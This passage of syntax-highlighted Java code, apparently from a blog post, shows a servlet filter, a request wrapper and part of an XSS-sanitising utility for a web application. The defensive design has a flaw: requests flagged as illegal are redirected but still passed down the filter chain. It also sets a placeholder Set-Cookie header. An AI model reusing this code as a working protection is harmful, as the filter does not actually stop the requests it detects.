    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">{</span>
        <span class="token comment">// 初始化时读取web.xml中配置的init-param</span>
        excludedPaths <span class="token operator">=</span> filterConfig<span class="token punctuation">.</span><span class="token function">getInitParameter</span><span class="token punctuation">(</span><span class="token string">"excludedPaths"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>excludedPaths<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            excludedPathArray <span class="token operator">=</span> excludedPaths<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> res<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">{</span>
        <span class="token class-name">HttpServletRequest</span> request <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> req<span class="token punctuation">;</span>
        <span class="token class-name">HttpServletResponse</span> resp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">)</span> res<span class="token punctuation">;</span>
        request<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> url <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getServletPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 要访问的url</span>
        <span class="token comment">// 判断是否是直接放行的请求</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"/overtime"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">isFilterExcludeRequest</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 会丢参的访问</span>
            chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token comment">// 非法请求检查</span>
            <span class="token class-name">AtomicBoolean</span> checkIllegal <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicBoolean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 添加X-Frame-Options响应头</span>
            resp<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            resp<span class="token punctuation">.</span><span class="token function">addHeader</span><span class="token punctuation">(</span><span class="token string">"X-Frame-Options"</span><span class="token punctuation">,</span> <span class="token string">"SAMEORIGIN"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            resp<span class="token punctuation">.</span><span class="token function">addHeader</span><span class="token punctuation">(</span><span class="token string">"X-Download-Options"</span><span class="token punctuation">,</span> <span class="token string">"noopen"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            resp<span class="token punctuation">.</span><span class="token function">addHeader</span><span class="token punctuation">(</span><span class="token string">"X-Permitted-Cross-Domain-Policies"</span><span class="token punctuation">,</span> <span class="token string">"master-only"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            resp<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"strict-transport-security"</span><span class="token punctuation">,</span> <span class="token string">"max-age=16070400; includeSubDomains"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            resp<span class="token punctuation">.</span><span class="token function">addHeader</span><span class="token punctuation">(</span><span class="token string">"Referrer-Policy"</span><span class="token punctuation">,</span> <span class="token string">"no-referrer-when-downgrade"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            resp<span class="token punctuation">.</span><span class="token function">addHeader</span><span class="token punctuation">(</span><span class="token string">"Set-Cookie"</span><span class="token punctuation">,</span> <span class="token string">"cookiename=value;Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            request <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MHttpServletRequest</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> checkIllegal<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>checkIllegal<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// 非法请求拦截</span>
                resp<span class="token punctuation">.</span><span class="token function">sendRedirect</span><span class="token punctuation">(</span><span class="token string">"/publicUser/overtime?state=100011"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 54
     * 判断是否是 过滤器直接放行的请求
     * 55
     * &lt;br/&gt;主要用于静态资源的放行
     *
     * @return 58
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token function">isFilterExcludeRequest</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">null</span> <span class="token operator">!=</span> excludedPathArray <span class="token operator">&amp;&amp;</span> excludedPathArray<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">String</span> url <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getServletPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> ecludedUrl <span class="token operator">:</span> excludedPathArray<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>ecludedUrl<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"*."</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token comment">// 如果配置的是后缀匹配, 则把前面的*号干掉，然后用endWith来判断</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span>ecludedUrl<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>ecludedUrl<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"/*"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ecludedUrl<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token comment">// 前缀匹配，必须要是/开头</span>
                        ecludedUrl <span class="token operator">=</span> <span class="token string">"/"</span> <span class="token operator">+</span> ecludedUrl<span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                    <span class="token comment">// 如果配置是前缀匹配, 则把最后的*号干掉，然后startWith来判断</span>
                    <span class="token class-name">String</span> prffixStr <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getContextPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> ecludedUrl<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> ecludedUrl<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>prffixStr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    <span class="token comment">// 如果不是前缀匹配也不是后缀匹配,那就是全路径匹配</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ecludedUrl<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token comment">// 全路径匹配，也必须要是/开头</span>
                        ecludedUrl <span class="token operator">=</span> <span class="token string">"/"</span> <span class="token operator">+</span> ecludedUrl<span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                    <span class="token class-name">String</span> targetUrl <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getContextPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> ecludedUrl<span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>targetUrl<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>dayainfo<span class="token punctuation">.</span>ssp<span class="token punctuation">.</span>common<span class="token punctuation">.</span>safety</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>dayainfo<span class="token punctuation">.</span>ssp<span class="token punctuation">.</span>common<span class="token punctuation">.</span>safety<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">XssShieldUtil</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequestWrapper</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span></span><span class="token class-name">AtomicBoolean</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MHttpServletRequest</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServletRequestWrapper</span> <span class="token punctuation">{</span>

    <span class="token comment">// 非法请求标记，存在注入嫌疑，禁止访问</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">AtomicBoolean</span> checkIllegal<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">MHttpServletRequest</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">AtomicBoolean</span> checkIllegal<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>checkIllegal <span class="token operator">=</span> checkIllegal<span class="token punctuation">;</span>
        <span class="token function">doParamFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token class-name">String</span> nameFilter <span class="token operator">=</span> <span class="token class-name">XssShieldUtil</span><span class="token punctuation">.</span><span class="token function">stripXss</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> checkIllegal<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 返回值之前 先进行过滤</span>
        <span class="token keyword">final</span> <span class="token class-name">String</span> value <span class="token operator">=</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span>nameFilter<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token class-name">XssShieldUtil</span><span class="token punctuation">.</span><span class="token function">stripXss</span><span class="token punctuation">(</span>nameFilter<span class="token punctuation">,</span> value<span class="token punctuation">,</span> checkIllegal<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getParameterValues</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token class-name">String</span> nameFilter <span class="token operator">=</span> <span class="token class-name">XssShieldUtil</span><span class="token punctuation">.</span><span class="token function">stripXss</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> checkIllegal<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 返回值之前 先进行过滤</span>
        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> values <span class="token operator">=</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">getParameterValues</span><span class="token punctuation">(</span>nameFilter<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>values <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> values<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                values<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token class-name">XssShieldUtil</span><span class="token punctuation">.</span><span class="token function">stripXss</span><span class="token punctuation">(</span>nameFilter<span class="token punctuation">,</span> values<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> checkIllegal<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> values<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doParamFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> name <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getParameterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getParameterValues</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>dayainfo<span class="token punctuation">.</span>ssp<span class="token punctuation">.</span>common<span class="token punctuation">.</span>safety<span class="token punctuation">.</span>util</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>dayainfo<span class="token punctuation">.</span>ssp<span class="token punctuation">.</span>common<span class="token punctuation">.</span>safety<span class="token punctuation">.</span>constant<span class="token punctuation">.</span></span><span class="token class-name">SafeFilterConstant</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>dayainfo<span class="token punctuation">.</span>ssp<span class="token punctuation">.</span>common<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">EscapeUnescape</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>dayainfo<span class="token punctuation">.</span>ssp<span class="token punctuation">.</span>common<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">StringUtil</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Pair</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">StringUtils</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span></span><span class="token class-name">Test</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLDecoder</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Locale</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span></span><span class="token class-name">AtomicBoolean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>regex<span class="token punctuation">.</span></span><span class="token class-name">Matcher</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>regex<span class="token punctuation">.</span></span><span class="token class-name">Pattern</span></span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 处理非法字符
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">XssShieldUtil</span> <span class="token punctuation">{</span>
    <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">decodeParam</span><span class="token punctuation">(</span><span class="token class-name">String</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> value<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">int</span> totalCount <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span>value<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"%"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">--</span>totalCount <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                value <span class="token operator">=</span> <span class="token class-name">URLDecoder</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> <span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"NumberFormatException"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> value<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                value <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>value<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token keyword">int</span> totalCount <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
                <span class="token keyword">while</span> <span class="token punctuation">(</span>value<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"%"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">--</span>totalCount <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    value <span class="token operator">=</span> <span class="token class-name">EscapeUnescape</span><span class="token punctuation">.</span><span class="token function">unescape</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>value<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"【decode失败】：%s\n"</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">checkFilter</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token operator">!</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">SafeFilterConstant</span><span class="token punctuation">.</span>noFilterList<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">stripXss</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">String</span> value<span class="token punctuation">,</span> <span class="token class-name">AtomicBoolean</span> checkIllegal<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">checkFilter</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> value<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token function">stripXss</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> checkIllegal<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 过滤清理
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">stripXss</span><span class="token punctuation">(</span><span class="token class-name">String</span> value<span class="token punctuation">,</span> <span class="token class-name">AtomicBoolean</span> checkIllegal<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token class-name">String</span> tmpValue <span class="token operator">=</span> value<span class="token punctuation">;</span>
        <span class="token comment">// URLDecode</span>
        value <span class="token operator">=</span> <span class="token function">decodeParam</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 放行</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">checkFilter</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> value<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
